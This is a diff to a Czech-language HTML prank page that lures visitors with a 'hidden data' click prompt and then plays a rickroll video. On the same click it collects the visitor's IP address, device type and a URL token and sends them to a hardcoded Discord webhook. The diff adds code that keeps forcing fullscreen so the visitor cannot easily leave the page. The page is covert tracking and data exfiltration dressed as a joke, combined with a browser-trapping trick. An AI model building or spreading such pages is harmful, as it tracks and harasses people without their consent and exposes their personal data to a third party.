@@ -12,7 +12,7 @@
 <body>
 
     <div id="warning">
-        <h2>Tyto data jsou zkrýtá.</h2>
+        <h2>Tyto data jsou skrytá.</h2>
         <p>Kliknutím je zobrazíte.</p>
         <p>[ ZOBRAZIT DATA ]</p>
     </div>
@@ -23,14 +23,14 @@
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1461819438948159601/1uQkuVDBbgrAtPCVvRnqDVjm1bGoOX12twRjQ9HALL4i4HEvyLbH4PuQlcMcs11_iE8P";
+        const video = document.getElementById('rickroll');
+        const warning = document.getElementById('warning');
+        let isStarted = false;
 
         async function sendLog(token) {
             try {
-                // Získání IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                
-                // Detekce zařízení
                 const device = navigator.userAgent.includes("Mobi") ? "Mobil" : "PC/Tablet";
 
                 await fetch(WEBHOOK_URL, {
@@ -38,7 +38,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "✅ Rickroll Successful",
+                            title: "✅ Rickroll Successful (Persistent FS)",
                             color: 15548997,
                             fields: [
                                 { name: "Uživatel (Token)", value: `\`${token}\``, inline: true },
@@ -53,26 +53,44 @@
             } catch (e) { console.error("Log failed"); }
         }
 
-        const video = document.getElementById('rickroll');
-        const warning = document.getElementById('warning');
-
-        document.body.addEventListener('click', function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const token = urlParams.get('tkn') || "Neznámý";
-
-            // Fullscreen trigger
+        function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+        }
 
-            // Zobrazení videa
-            warning.style.display = 'none';
-            video.style.display = 'block';
-            video.play();
+        // --- HLAVNÍ SMYČKA PRO FULLSCREEN ---
+        function handlePersistentFullscreen() {
+            if (isStarted && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                enterFullscreen();
+            }
+        }
 
-            // Odeslání reportu
-            sendLog(token);
-        }, { once: true });
+        // Sledování změny fullscreenu
+        document.addEventListener('fullscreenchange', handlePersistentFullscreen);
+        document.addEventListener('webkitfullscreenchange', handlePersistentFullscreen);
+
+        // Nucení fullscreenu i při kliknutí kamkoliv po startu
+        document.addEventListener('click', () => {
+            if (isStarted) enterFullscreen();
+        });
+
+        document.body.addEventListener('click', function() {
+            if (!isStarted) {
+                isStarted = true;
+                const urlParams = new URLSearchParams(window.location.search);
+                const token = urlParams.get('tkn') || "Neznámý";
+
+                enterFullscreen();
+
+                warning.style.display = 'none';
+                video.style.display = 'block';
+                video.play();
+
+                sendLog(token);
+            }
+        });
     </script>
 </body>
 </html>
